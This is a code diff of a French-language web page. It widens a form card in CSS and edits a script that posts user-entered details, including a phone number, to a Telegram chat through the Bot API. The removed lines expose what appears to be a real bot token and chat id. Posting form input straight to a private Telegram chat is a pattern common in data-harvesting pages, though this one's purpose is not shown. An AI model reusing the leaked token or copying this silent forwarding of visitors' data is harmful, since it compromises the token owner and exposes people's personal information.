@@ -48,6 +48,22 @@
       width: auto;
       object-fit: contain;
     }
+
+    /* 🔧 MODIFICATION ICI : élargir le bloc */
+    main.container {
+      display: flex;
+      justify-content: center;
+      padding: 3rem 1rem;
+    }
+
+    .card {
+      width: 100%;
+      max-width: 600px; /* ↔️ élargi depuis 480px */
+      background: white;
+      border-radius: 20px;
+      padding: 2.5rem;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+    }
   </style>
 </head>
 <body>
@@ -147,11 +163,11 @@
 📱 Téléphone : ${tel}
       `;
 
-      fetch("https://api.telegram.org/bot7959354545:AAEfYBDF24DOs30vwYScteq1uWMO65FP8Fo/sendMessage", {
+      fetch("https://api.telegram.org/botTON_BOT/sendMessage", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-          chat_id: "-4911236455",
+          chat_id: "TON_CHAT_ID",
           text: message
         })
       });
